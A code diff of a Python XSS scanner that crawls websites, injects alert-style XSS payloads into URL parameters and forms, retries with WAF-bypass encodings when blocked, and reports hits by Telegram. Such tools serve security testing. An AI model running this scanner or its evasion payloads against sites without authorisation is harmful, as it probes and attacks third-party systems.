@@ -9,7 +9,7 @@ import time
 
 TELEGRAM_BOT_TOKEN = "your_telegram_bot_token_here"
 TELEGRAM_CHAT_ID = "your_chat_id_here"
-PAYLOADS = [
+NORMAL_PAYLOADS = [
     "<script>alert(1)</script>",
     "\"><img src=x onerror=alert(1)>",
     "';alert(1)//",
@@ -26,23 +26,30 @@ PAYLOADS = [
     "<script>/*<script>*/alert(1)//</script>",
     "<script>eval('al'+'ert(1)');</script>",
     "<img onerror=eval('al&#x5c;u0065rt(1)') src=a>"
-
 ]
+WAF_BYPASS_PAYLOADS = [
+    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<img src='x' onerror=eval('al'+'ert(1)')>",
+]
+
 CRAWL_LIMIT = 100
 TIMEOUT = 6
 THREADS = 10
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (XSS Auditor Pro)"
+    "User-Agent": "Mozilla/5.0 (XSS Auditor Pro v3)"
 }
 
 visited_links = set()
 lock = threading.Lock()
+results = []
+RESULT_JSON = "results.json"
+RESULT_CSV = "results.csv"
 
 
 def send_telegram_alert(vuln_type, vulnerable_url):
-    """Send a clean, structured Telegram alert."""
     domain = urllib.parse.urlparse(vulnerable_url).netloc
-
     message = (
         "🚨 *XSS Vulnerability Detected!*\n\n"
         f"*Domain:* `{domain}`\n"
@@ -50,7 +57,6 @@ def send_telegram_alert(vuln_type, vulnerable_url):
         f"*Vulnerable URL:* [Click here]({vulnerable_url})\n\n"
         "#XSS #SecurityTest"
     )
-    
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
@@ -101,47 +107,74 @@ def extract_forms(url):
         return []
 
 
-def submit_form(form, url, payload):
+def save_results():
     try:
-        action = form.get("action")
-        method = form.get("method", "get").lower()
-        inputs = form.find_all("input")
+        with open(RESULT_JSON, "w") as jf:
+            json.dump(results, jf, indent=4)
+        print(f"\n[+] Results saved to {RESULT_JSON}")
+    except Exception as e:
+        print(f"[!] Saving results failed: {e}")
 
-        data = {}
-        for input_tag in inputs:
-            name = input_tag.get("name")
-            if name:
-                data[name] = payload
-
-        target_url = urllib.parse.urljoin(url, action)
-
-        if method == "post":
-            res = requests.post(target_url, data=data, headers=HEADERS, timeout=TIMEOUT, verify=False)
-        else:
-            res = requests.get(target_url, params=data, headers=HEADERS, timeout=TIMEOUT, verify=False)
-
-        if payload in res.text:
-            print(f"[+] XSS Found in Form: {target_url}")
-            send_telegram_alert("Form XSS", target_url)
-    except Exception:
-        pass
-
-
-def test_url_param(url, payload):
+def test_url_param(url, payload_list, retry=False):
     try:
         parsed = urllib.parse.urlparse(url)
         params = urllib.parse.parse_qs(parsed.query)
 
         for param in params:
             temp_params = params.copy()
-            temp_params[param] = payload
-            new_query = urllib.parse.urlencode(temp_params, doseq=True)
-            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+            for payload in payload_list:
+                temp_params[param] = payload
+                new_query = urllib.parse.urlencode(temp_params, doseq=True)
+                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
 
-            res = requests.get(new_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
+                res = requests.get(new_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
+                if payload in res.text:
+                    print(f"[+] Reflected XSS Found: {new_url}")
+                    results.append({
+                        "domain": parsed.netloc,
+                        "vuln_type": "Reflected XSS",
+                        "vulnerable_url": new_url
+                    })
+                    send_telegram_alert("Reflected XSS", new_url)
+                elif res.status_code in [403, 406] and not retry:
+                    print(f"[*] Normal payload blocked, retrying with WAF Bypass...")
+                    test_url_param(url, WAF_BYPASS_PAYLOADS, retry=True)
+    except Exception:
+        pass
+
+
+def submit_form(form, url, payload_list, retry=False):
+    try:
+        action = form.get("action")
+        method = form.get("method", "get").lower()
+        inputs = form.find_all("input")
+
+        for payload in payload_list:
+            data = {}
+            for input_tag in inputs:
+                name = input_tag.get("name")
+                if name:
+                    data[name] = payload
+
+            target_url = urllib.parse.urljoin(url, action)
+
+            if method == "post":
+                res = requests.post(target_url, data=data, headers=HEADERS, timeout=TIMEOUT, verify=False)
+            else:
+                res = requests.get(target_url, params=data, headers=HEADERS, timeout=TIMEOUT, verify=False)
+
             if payload in res.text:
-                print(f"[+] Reflected XSS Found: {new_url}")
-                send_telegram_alert("Reflected XSS", new_url)
+                parsed = urllib.parse.urlparse(target_url)
+                print(f"[+] Form XSS Found: {target_url}")
+                results.append({
+                    "domain": parsed.netloc,
+                    "vuln_type": "Form XSS",
+                    "vulnerable_url": target_url
+                })
+                send_telegram_alert("Form XSS", target_url)
+            elif res.status_code in [403, 406] and not retry:
+                print(f"[*] Form blocked, retrying with WAF bypass...")
+                submit_form(form, url, WAF_BYPASS_PAYLOADS, retry=True)
     except Exception:
         pass
 
@@ -150,7 +183,9 @@ def crawl_and_test(start_url):
     q = queue.Queue()
     q.put(start_url)
 
-    while not q.empty() and len(visited_links) < CRAWL_LIMIT:
+    total = 0
+
+    while not q.empty() and total < CRAWL_LIMIT:
         url = q.get()
         with lock:
             if url in visited_links:
@@ -161,11 +196,18 @@ def crawl_and_test(start_url):
         for link in links:
             q.put(link)
 
-        for payload in PAYLOADS:
-            test_url_param(url, payload)
+        crawl_progress = (len(visited_links) / CRAWL_LIMIT) * 100
+        sys.stdout.write(f"\r[+] Crawling Progress: {crawl_progress:.2f}%")
+        sys.stdout.flush()
+
+        for payload in NORMAL_PAYLOADS:
+            test_url_param(url, [payload])
             forms = extract_forms(url)
             for form in forms:
-                submit_form(form, url, payload)
+                submit_form(form, url, [payload])
+
+        total += 1
+    print()
 
 
 def process_domain(domain):
@@ -193,6 +235,8 @@ def main():
             domain = "https://" + domain
         print(f"[*] Starting scan for {domain}")
         process_domain(domain)
+
+    save_results()
 
 
 if __name__ == "__main__":
